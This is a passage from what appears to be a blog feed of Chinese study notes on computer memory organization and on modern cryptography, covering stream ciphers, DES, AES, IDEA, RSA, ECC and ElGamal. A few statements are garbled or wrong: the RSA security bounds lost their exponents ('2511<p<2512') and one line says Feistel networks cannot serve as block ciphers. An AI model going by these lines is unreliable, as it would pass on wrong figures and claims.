问题</h3><ol><li>引入总线会导致什么问题？如何解决？</li></ol><p>引入总线后，总线上的各个设备分时共享同一总线，当总线上多个设备同时要求使用总线时就会导致总线的冲突。为解决多个主设备同时竞争总线控制权的问题，应当采用总线仲裁部件，以某种方式选择一个主设备优先获得总线控制权，只有获得了总线控制权的设备才能开始数据传送。</p><ol start="2"><li>引入总线结构有什么好处？</li></ol><p>引入总线结构主要有以下优点<br>①简化了系统结构，便于系统设计制造。<br>②大大减少了连线数目，便于布线，减小体积，提高系统的可靠性<br>③便于接口设计，所有与总线连接的设备均采用类似的接口。<br>④便于系统的扩充、更新与灵活配置，易于实现系统的模块化<br>⑤便于设备的软件设计，所有接口的软件对不同的接口地址进行操作。<br>⑥便于故障诊断和维修，同时也能降低成本。</p><h2 id="第四章-存储器"><a class="markdownIt-Anchor" href="#第四章-存储器"></a> 第四章 存储器</h2><h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3><h4 id="存储器分类"><a class="markdownIt-Anchor" href="#存储器分类"></a> 存储器分类</h4><p>按在计算机中的作用：</p><ol><li>主存储器，简称主存。CPU可直接随机地对其进行访问，也可以和高速缓存器及辅助存储器交换数据。</li><li>辅助存储器，简称辅存。CPU不能直接访问，用来存放当前暂时用不到的程序段和数据。</li><li>高速缓冲存储器，位于主存和CPU之间，用来存放正在执行的程序段和数据。<br>按存储介质分类：<br>磁表面存储器（磁盘，磁带），磁心存储器半导体存储器（MOS型存储器，双极存储器）和光存储器（光盘）。<br>按存取方式：</li><li>随机存取存储器（RAM）。存储器的任何一个存储单元的内容都可以随机存取，而且存取时间与存取单元的物理位置无关，主要用作主存或高速缓冲存储器。</li><li>只读存储器（ROM）存储器的内容只能随机读出而不能写入。即使断电，内容也不会丢失。</li><li>串行访问存储器。对存储单元进行读/写操作时，需按其物理位置的先后顺序寻址，包括顺序存取存储器（如磁带）与直接存取存储器（如磁盘）。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619154156.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619154204.png" alt></li></ol><h4 id="存储器的性能指标"><a class="markdownIt-Anchor" href="#存储器的性能指标"></a> 存储器的性能指标</h4><p>&lt;1&gt; 存储容量：存储字数*字长</p><p>&lt;2&gt; 单位成本：每位价格=总成本/总容量</p><p>&lt;3&gt; 存储速度：数据传输率=数据的宽度/存储周期<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619154624.png" alt></p><h4 id="存储器的层次结构"><a class="markdownIt-Anchor" href="#存储器的层次结构"></a> 存储器的层次结构</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619155055.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/2.png" alt></p><h3 id="主存储器"><a class="markdownIt-Anchor" href="#主存储器"></a> 主存储器</h3><h4 id="半导体随机存储器"><a class="markdownIt-Anchor" href="#半导体随机存储器"></a> 半导体随机存储器</h4><h5 id="sram-和-dram"><a class="markdownIt-Anchor" href="#sram-和-dram"></a> SRAM 和 DRAM</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161159.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161435.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161504.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161514.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161526.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161543.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619161559.png" alt></p><h5 id="只读存储器"><a class="markdownIt-Anchor" href="#只读存储器"></a> 只读存储器</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163124.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163128.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163141.png" alt></p><h5 id="主存储器与cpu的连接"><a class="markdownIt-Anchor" href="#主存储器与cpu的连接"></a> 主存储器与CPU的连接</h5><p>主存容量的扩展：</p><ol><li>位扩展<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163333.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163345.png" alt></li><li>字扩展<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163441.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163446.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163451.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163457.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163502.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163508.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163513.png" alt></li><li>字位同时扩展<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163553.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240619163613.png" alt></li></ol><h4 id="存储器的校验"><a class="markdownIt-Anchor" href="#存储器的校验"></a> 存储器的校验</h4><p>汉明码的组成、汉明码的纠错过程</p><h4 id="提高访存速度的措施"><a class="markdownIt-Anchor" href="#提高访存速度的措施"></a> 提高访存速度的措施</h4><p>单体多字系统、多体并行系统、高性能存储芯片</p><h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2><p><a href="https://blog.csdn.net/haojie_duan/article/details/112739522">https://blog.csdn.net/haojie_duan/article/details/112739522</a><br><a href="https://blog.csdn.net/weixin_65520839/article/details/134017151">https://blog.csdn.net/weixin_65520839/article/details/134017151</a></p>]]></content>
      
      
      <categories>
          
          <category> Education </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学</title>
      <link href="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h3 id="第一章-概述"><a class="markdownIt-Anchor" href="#第一章-概述"></a> 第一章 概述</h3><h4 id="信息安全三要素"><a class="markdownIt-Anchor" href="#信息安全三要素"></a> 信息安全三要素</h4><p>保密性： 使截获者在不知密钥条件下不能解读信息。<br>完整性：保证信息从真实的发送者传送到真实的接收者手中，传送过程中没有非法用户添加删除和替换<br>可用性：指保障信息资源随时可提供服务的能力特性/保证经过授权的客户能及时准确地不间断的访问数据。</p><h4 id="属性"><a class="markdownIt-Anchor" href="#属性"></a> 属性</h4><p>认证性：使任何不知密钥的人不能构造一个密钥，使意定的接收者脱密成一个可理解的消息。<br>不可否认性：对出现的安全问题提供调查的依据和手段。使用审计、监控、防抵赖等安全机制，使得攻击者、破坏者、抵赖者“逃不脱&quot;，并进一步对网络出现的安全问题提供调查依据和手段，实现信息安全的可审查性</p><p>实时性</p><h4 id="kerckhoff-原则"><a class="markdownIt-Anchor" href="#kerckhoff-原则"></a> kerckhoff 原则</h4><p>Kerckhoff 原则： 系统的保密性不依赖与对加密提示或算法的保密，而依赖于密钥。</p><h4 id="密码分析"><a class="markdownIt-Anchor" href="#密码分析"></a> 密码分析</h4><p>依据攻击者知道的信息多少，密码可能经受的不同水平的攻击：</p><p>唯密文攻击：分析者仅拥有的截获密文，试图进行分析得出明文或密钥。</p><p>已知明文攻击 ：分析者已有很多明文-密文对，试图进行分析得出明文或密钥。</p><p>选择明文攻击：分析者可以选定任何明文-密文对来进行攻击，以确定未知的密钥。</p><p>选择密文攻击：分析者可以任意选择密文，并可获得相应明文</p><p>CPA安全：CPA（Chosen-Plaintext Attack），选择明文攻击</p><p>密码可能经受的不同水平的攻击</p><h4 id="密钥体制分类"><a class="markdownIt-Anchor" href="#密钥体制分类"></a> 密钥体制分类</h4><p>单钥体制：加密和解密密钥相同，主要问题是密钥产生和密钥管理包括流密码和分组密码。<br>双钥体制：加密和解密密钥不同，安全性可实现对A所发消息的验证<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921237.png" alt></p><p>一般说来，加密算法很难达到“无条件安全”。因此在实际上只需满足两条准则即可，试给出这两条准则。<br>实际上需满足计算上安全：<br>1、破译密文的代价超过被加密信息的价值<br>2、破译密文多花的时间超过信息的有用期</p><h3 id="第二章-流密码"><a class="markdownIt-Anchor" href="#第二章-流密码"></a> 第二章 流密码</h3><h4 id="基本概念和分类"><a class="markdownIt-Anchor" href="#基本概念和分类"></a> 基本概念和分类</h4><p>流密码是将明文划分为字符，或其编码的基本单元，每一字符分别与密钥流对应字符“作用”，从而进行加密，解密时以同步产生的同样的密钥流实现。<br>流密码强度完全依赖于密钥流生成器生成的密钥流的随机性和不可预测性<br>流密码有记忆性，分组密码则没有。</p><ol><li>同步流密码：密钥流产生算法和明文（密文）无关</li><li>自同步流密码：密钥流产生算法与明文（密文）有关</li></ol><h4 id="n级反馈移位寄存器"><a class="markdownIt-Anchor" href="#n级反馈移位寄存器"></a> n级反馈移位寄存器</h4><p>GF（2）上一个n级反馈移位寄存器有n个二元存储器与一个反馈函数f（a1，a2，…，an）组成<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921238.png" alt></p><h4 id="线性反馈移位寄存器lfsr"><a class="markdownIt-Anchor" href="#线性反馈移位寄存器lfsr"></a> 线性反馈移位寄存器（LFSR）</h4><p>GF(2)上的n级线性反馈移位寄存器，f(a1,a2,…,an)= cna1⊕cn−1a2⊕L⊕c1an<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921239.png" alt></p><p>n级LFSR状态数：最多有2^n个<br>n级LFSR的状态周期：&lt;=2^n-1。输出序列的周期=状态周期。<br>周期达到最大值的序列称为m序列<br>LFSR的特征多项式：p(x)=1+c1x+…＋cn-1xn-1＋cnxn<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921240.png" alt></p><h4 id="m序列"><a class="markdownIt-Anchor" href="#m序列"></a> m序列</h4><p>伪随机序列：密钥流不可能完全做到随机性，只能要求截获比周期短的一段序列时不会泄露更多的信息<br>游程：连续的0或1的个数</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921241.png" alt></p><p>三个有关伪随机序列的随机性公设：</p><p>1.在一个周期内，0和1的个数相差最多为1<br>2.在序列某个周期内，长为1的游程占游程数的1/2，长为2<br>的游程占游程总数的1/2<sup>2，长为i的游程占游程总数的1/2</sup>i,且0和1的游程数相等.<br>3.异相自相关函数为一个常数。<br>m序列满足如上的三个随机性公设。</p><p>对于m序列，游程总数为2^(n-1)。</p><p>GF(2)上周期为 T 的序列{ai }的自相关函数</p><p>设序列{ai}满足线性递推关系：<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921242.png" alt></p><h4 id="m序列的破译"><a class="markdownIt-Anchor" href="#m序列的破译"></a> m序列的破译</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921243.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921244.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921245.png" alt></p><h3 id="第三章-分组密码"><a class="markdownIt-Anchor" href="#第三章-分组密码"></a> 第三章 分组密码</h3><h4 id="基本概念和分类-2"><a class="markdownIt-Anchor" href="#基本概念和分类-2"></a> 基本概念和分类</h4><p>分组密码：若明文流被分割成等长串，各串用相同的加密算法和相同的密钥进行加密，就是分组密码。</p><p>优缺点：<br>分度密码加解密算法简洁快速，所占的计算资源小，易于软件和硬件实现。<br>参数固定，比流密码更易实现标准化。<br>由于明文流被分段加密，因此容易实现同步，且传输错误不会向后扩散。但是分组密码的安全性很难被证明，至多证明局部安全性。</p><h4 id="分组密码的设计准则"><a class="markdownIt-Anchor" href="#分组密码的设计准则"></a> 分组密码的设计准则</h4><p>安全性：从任何角度难以攻破<br>简洁性：分组密码吗算法在满足安全性的同时尽可能简单快速。<br>有效性：分组密码设计应使密钥最大限度起到安全性作用。</p><p>透明性和灵活性：透明性即要求算法是可证明安全的，灵活性即要求算法的实现可以适应多种计算环境；明文分组长度可以伸缩；算法可以移植和变形。</p><p>加解密相似性：加密算法和解密算法相同仅仅 密钥的编排不同。这里举的两个例子，异或和模 2n 加</p><h4 id="分组密码的设计"><a class="markdownIt-Anchor" href="#分组密码的设计"></a> 分组密码的设计</h4><h5 id="feistel网络"><a class="markdownIt-Anchor" href="#feistel网络"></a> Feistel网络</h5><p>Feistel 网络不能用作分组密码算法。Feistel 网络的基本模块是 F-函数。</p><p>F-函数：一个依赖于密钥的把输入串映射到输出串的映射，通常是非线性且不可逆的</p><h6 id="加密"><a class="markdownIt-Anchor" href="#加密"></a> 加密</h6><p>(1)将明文分组分割成长度相同的两块（L0,R0);</p><p>(2)对每一轮，i=0,1,…,n,</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921246.png" alt></p><h6 id="解密"><a class="markdownIt-Anchor" href="#解密"></a> 解密</h6><p>（1）对于密文的解密，每一轮，i=n,n-1,…,0,<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921247.png" alt></p><h5 id="s-盒输入输出长度比较小的用输入输出真值表来-计算的仅仅实现高度非线性功能的计算部件称为-s-盒"><a class="markdownIt-Anchor" href="#s-盒输入输出长度比较小的用输入输出真值表来-计算的仅仅实现高度非线性功能的计算部件称为-s-盒"></a> S 盒：输入/输出长度比较小的，用输入/输出真值表来 计算的，仅仅实现高度非线性功能的计算部件称为 S 盒</h5><h5 id="des"><a class="markdownIt-Anchor" href="#des"></a> DES</h5><h6 id="基本结构"><a class="markdownIt-Anchor" href="#基本结构"></a> 基本结构</h6><p>DES 是一个 对称密码体制。 加解密使用同一密钥，有效密钥长度为56位。分组长度为64位。明文和密文长度相等。<br>DES的初始密钥长度也为64位，但有效的密钥为56位，因为第8、16、24、40、48、56和64位都是奇校验位。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921248.jpeg" alt></p><p>加密过程主要有3个阶段</p><ol><li>64位的明文经过初始置换而被重新排列，并将其分为左右两组L0和 R0，各为32位。</li><li>在密钥参与下，左右两个分组进行16轮相同论函数的迭代，每轮迭代有置换和代换。（最后一轮迭代的输出为64位，左半和右半不进行交换）</li><li>然后通过逆初始置换产生64位密文。</li></ol><p>DES加密算法有四个步骤：初始置换、生成子密钥、迭代过程、逆置换。核心的部件包括初始置换和F函数（E扩展置换，S盒压缩代换，P盒置换运算）以及逆置换</p><h6 id="初始置换和逆初始置换"><a class="markdownIt-Anchor" href="#初始置换和逆初始置换"></a> 初始置换和逆初始置换</h6><p>初始置换（IP）是在第一轮迭代之前进行的，目的是将原明文块的位进行换位，其置换表是固定的。</p><p>逆初始置换（IP−1）是初始置换的逆置换，数据块经过初始置换和逆初始置换后恢复到原来的位置</p><h6 id="轮结构"><a class="markdownIt-Anchor" href="#轮结构"></a> 轮结构</h6><p>DES的轮函数F由四个部分组成：扩展置换、异或运算、s盒运算、p盒运算。</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921249.png" alt></p><h6 id="密钥生成"><a class="markdownIt-Anchor" href="#密钥生成"></a> 密钥生成</h6><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604204618.png" alt></p><h6 id="des的安全性"><a class="markdownIt-Anchor" href="#des的安全性"></a> DES的安全性</h6><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604204710.png" alt><br>DES存在弱密钥和半弱密钥。所谓弱密钥指的是在同一密钥下加密两次为恒等变换，DES存在4个弱密钥</p><pre class="line-numbers language-none"><code class="language-none">0101010101010101（十六进制表示：0x0101010101010101）FEFEFEFEFEFEFEFE（十六进制表示：0xFEFEFEFEFEFEFEFE）E0E0E0E0F1F1F1F1（十六进制表示：0xE0E0E0E0F1F1F1F1）1F1F1F1F0E0E0E0E（十六进制表示：0x1F1F1F1F0E0E0E0E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="五个工作模式"><a class="markdownIt-Anchor" href="#五个工作模式"></a> 五个工作模式</h4><h5 id="ecb模式电码本模式"><a class="markdownIt-Anchor" href="#ecb模式电码本模式"></a> ECB模式（电码本模式）</h5><p>每个明文分组独立加解密<br>优点：</p><p>简单、高速</p><p>无差错传播：单个密文分组出现错误只会影响该分组的解密，不会影响到其他分组</p><p>缺点：</p><p>（1） 相同明文分组对应相同密文分组</p><p>（2） 不能隐蔽明文分组的统计规律和结构规律,不能抵抗替换攻击应用：<br>用法：</p><p>（1） 用于随机数的加密保护</p><p>（2） 用于单分组明文的加密</p><h5 id="cbc模式密码分组链接模式"><a class="markdownIt-Anchor" href="#cbc模式密码分组链接模式"></a> CBC模式（密码分组链接模式）</h5><p>每个明文分组先于前一密文分组异或，再进行加密<br>明文块的统计特性得到了隐蔽</p><p>有限差错传播：单个密文分组出现错误会影响该分组和后面一个密文分组的解密具有自同步功能</p><h5 id="cfb模式密码反馈模式"><a class="markdownIt-Anchor" href="#cfb模式密码反馈模式"></a> CFB模式（密码反馈模式）</h5><p>加密消息需按字符、字节或比特处理时，可采用CFB模式<br>实现简单（只要求加密算法）</p><p>比 CBC 慢很多，每次只有少数比特完成加密</p><p>单个密文分组出现一个比特错误，不仅影响该分组，还会最多影响后续[64/j] 个密文分组的解密<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604204220.png" alt></p><h5 id="ofb模式输出反馈模式"><a class="markdownIt-Anchor" href="#ofb模式输出反馈模式"></a> OFB模式（输出反馈模式）</h5><p>OFB模式是将加密算法的输出反馈到移位寄存器，cfb则是将密文单元反馈到移位寄存器。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604204233.png" alt><br>优点</p><p>隐藏了明文的模式；分组密码转化为流模式；无误差传送问题；可以及时加密传送小于分组的数据。</p><p>缺点</p><p>不利于并行计算；对明文的主动攻击是可能的，安全性较CFB差。</p><h5 id="ctr模式"><a class="markdownIt-Anchor" href="#ctr模式"></a> CTR模式</h5><pre><code>每个明文分组都与一个加密技术器相异或。对每个后续分组计数器递增</code></pre><h5 id="三重-des"><a class="markdownIt-Anchor" href="#三重-des"></a> 三重 DES</h5><p>三重 DES：  先加密后解密在加密<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604204430.png" alt></p><h4 id="aes加密"><a class="markdownIt-Anchor" href="#aes加密"></a> AES加密</h4><p>明文长度为固定的128位，密钥长度可以是128位、192位、256位<br>输入128位明文，为16字节的数据，16字节的数据组成一个4*4的矩阵</p><h5 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程"></a> 加密过程</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921251.png" alt><br>其中9轮循环运算时，执行1-4步骤，最后一轮（第十轮)只执行124步</p><h6 id="初始变换"><a class="markdownIt-Anchor" href="#初始变换"></a> 初始变换</h6><p>16字节固定长度的明文和M字节的密钥分别形成4*4的矩阵，执行异或操作</p><h6 id="循环运算"><a class="markdownIt-Anchor" href="#循环运算"></a> 循环运算</h6><ol><li>字节代换：处理初始变换后的4*4矩阵</li><li>行移位：第一行不变，第二三四行行分别向左移动1、2、3个字节</li><li>列混合：将输入的4* 4 矩阵左乘一个给定的4*4矩阵</li><li>轮密钥加：将前面所得的4*4矩阵与该轮对应的轮密钥进行异或操作<br>经过9轮循环和一个最终轮，得到了最终的密文</li></ol><h4 id="idea"><a class="markdownIt-Anchor" href="#idea"></a> IDEA</h4><p>明文分组是64位，密钥为128位。<br>明文块分组：输入的64位数据块被分为4个16位分组：x1，x2，x3，x4，这4个分组成为算法的8轮计算第一轮的输入。在每一轮中，这4个分组互相异或，相加，相乘，且与6个16位子密钥相异或，相加，相乘。轮与轮间，第二和第三个分组交换，最后在输出变换中4个子分组与4个子密钥进行运算。</p><h5 id="子密钥的生成"><a class="markdownIt-Anchor" href="#子密钥的生成"></a> 子密钥的生成</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604202659.png" alt><br>8轮迭代操作，每轮需要6个子密钥，另外还需要4个额外子密钥用于输出变换，所以共需要52个子密钥，这个52子密钥都是从 128位密钥中扩展出来的。</p><p>首先把输入的Key分成8个16位的子密钥， 1-6 号子密钥供第一轮加密使用，7-8号子密钥供第二轮使用；然后把这个128位密钥循环左移25位，这样Key = k26k27k28…k24k25，把新生成的Key在分成8个16位的子密钥，1-4号子密钥供第二轮加密使用(前面已经提供了两个)5-8号子密钥在第三轮加密使用；到此我们已经得到了16个子密钥，如此继续，当循环左移了5次之后已经生成了48个子密钥,还有四个额外的子密钥需要生成，再次把Key循环左移25位,选取划分出来的8个16位子密钥的前4个作为那4个额外的加密密钥，至此，加密使用的52个子密钥生成完毕。</p><h5 id="加解密"><a class="markdownIt-Anchor" href="#加解密"></a> 加解密</h5><h6 id="加密-2"><a class="markdownIt-Anchor" href="#加密-2"></a> 加密</h6><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604203026.png" alt></p><ol><li><p>8轮迭代操作（每轮6个子密钥-&gt;K1-K6、… 、K43-K48）<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604203105.png" alt></p></li><li><p>输出变换（4个子密钥-&gt;K49~K52）<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604203159.png" alt></p></li></ol><h6 id="解密-2"><a class="markdownIt-Anchor" href="#解密-2"></a> 解密</h6><pre><code>   解密过程与加密过程完全相同，只是子密钥的生成与模式有所不同。解密子密钥实际上是加密子密钥的逆。</code></pre><h5 id="idea相关"><a class="markdownIt-Anchor" href="#idea相关"></a> IDEA相关</h5><p>安全性：暴力破译IDEA，需要进行2＾128次加密运算，即使取得正确的密钥只要平均搜索一半的密钥空间，依旧很难破解IDEA。同时，设计者尽最大努力使该算法不受差分密码分析的影响，数学家已证明IDEA算法在其8圈迭代的第4圈之后便不受差分密码分析的影响了，目前来看，比DES算法要相对安全得多；</p><p>分组密码：明文分组64位；<br>对称密码算法：密钥长度为128位；<br>优点：IDEA算法比RSA算法加、解密速度快得多；<br>缺点：解密过程子密钥需要求逆且有些微小差别。</p><h4 id="sm4"><a class="markdownIt-Anchor" href="#sm4"></a> SM4</h4><p>分组长度为128比特，密钥长度为128比特，字长度为32比特的字符串，因此分组和密钥长度为4字</p><h5 id="32轮迭代"><a class="markdownIt-Anchor" href="#32轮迭代"></a> 32轮迭代</h5><p>已知明文输入X0、X1、X2、X3，依次计算出X4-X35的字（32轮运算）<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921252.png" alt></p><h5 id="反序变换"><a class="markdownIt-Anchor" href="#反序变换"></a> 反序变换</h5><p>将计算出的结果X32-X35倒序</p><h3 id="第四章-公钥密码"><a class="markdownIt-Anchor" href="#第四章-公钥密码"></a> 第四章 公钥密码</h3><h4 id="公钥体制的基本原理是陷门单向函数"><a class="markdownIt-Anchor" href="#公钥体制的基本原理是陷门单向函数"></a> 公钥体制的基本原理是陷门单向函数</h4><p>陷门单向函数和单向函数不一样是这样的单向函数：在不知陷门信息下，由 f(x)求 x“极为困难” ， 当知道陷门信息后，由 f(x)求 x 是易于实现的<br>单向函数举例：（各自对应一种加密方法）</p><p>离散对数<br>大整数分解<br>背包问题</p><h4 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h4><p>第一步：选择两个大素数 p 和 q</p><p>第二步：计算 p 和 q 的乘积 n（n 转化成二进制一般是 1024 位，重要的话 2048位）</p><p>第三步：计算 n 的欧拉函数φ(n)=（p-1）*（q-1）</p><p>第四步：随机选整数e，1&lt; e &lt; φ(n)，且 e 与φ(n)互质，计算 e 对于φ(n)的乘法逆元 d</p><p>ed ≡ 1 (mod φ(n))</p><p>第五步：将 n 和 e 封装成公钥，n 和 d 封装成私钥</p><p>※加密：c≡ m^e mod n; c 为密文，且 0&lt;=c&lt;n</p><p>※解密：对于密文 0&lt;=c&lt;n，解密算法为：m≡ c^d mod n;</p><h5 id="rsa-的安全性分析"><a class="markdownIt-Anchor" href="#rsa-的安全性分析"></a> RSA 的安全性分析</h5><p>2511&lt;p&lt;2512</p><p>这样要穷举 2510 次，似乎足够安全</p><h4 id="背包密码"><a class="markdownIt-Anchor" href="#背包密码"></a> 背包密码</h4><h4 id="rabin密码"><a class="markdownIt-Anchor" href="#rabin密码"></a> Rabin密码</h4><p>第一步：选择两个大素数 p 和 q，要求 p 和 q 都是 4 的倍数加上 3</p><p>第二步：n=p*q</p><p>第三步：公钥 n，对外公布；私钥（p,q）则自己收着。</p><p>Rabin 加密体制加密过程：</p><p>明文 m 范围(0,n)计算密文方法：c=m^2(mod n)，c 是密文 B 在收到密文后，用私钥解密<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921253.png" alt></p><h5 id="解密-3"><a class="markdownIt-Anchor" href="#解密-3"></a> 解密</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921254.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921255.png" alt></p><h4 id="ecc"><a class="markdownIt-Anchor" href="#ecc"></a> ECC</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921256.png" alt></p><h5 id="椭圆曲线上的点数"><a class="markdownIt-Anchor" href="#椭圆曲线上的点数"></a> 椭圆曲线上的点数</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921257.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921258.png" alt></p><h5 id="加法运算"><a class="markdownIt-Anchor" href="#加法运算"></a> 加法运算</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921259.png" alt></p><h5 id="加密过程-2"><a class="markdownIt-Anchor" href="#加密过程-2"></a> 加密过程</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921260.png" alt></p><h4 id="elgamal"><a class="markdownIt-Anchor" href="#elgamal"></a> ElGamal</h4><p>密钥产生过程： 选择一素数p以及小于p的随机数x， g是p的原根，计算y≡g^x mod p。</p><h5 id="加密-3"><a class="markdownIt-Anchor" href="#加密-3"></a> 加密</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921261.png" alt></p><h5 id="解密-4"><a class="markdownIt-Anchor" href="#解密-4"></a> 解密</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921262.png" alt></p><h4 id="sm2"><a class="markdownIt-Anchor" href="#sm2"></a> SM2</h4><h3 id="第五章-密钥分配与密钥管理"><a class="markdownIt-Anchor" href="#第五章-密钥分配与密钥管理"></a> 第五章 密钥分配与密钥管理</h3><h4 id="diffie-hellman-交换"><a class="markdownIt-Anchor" 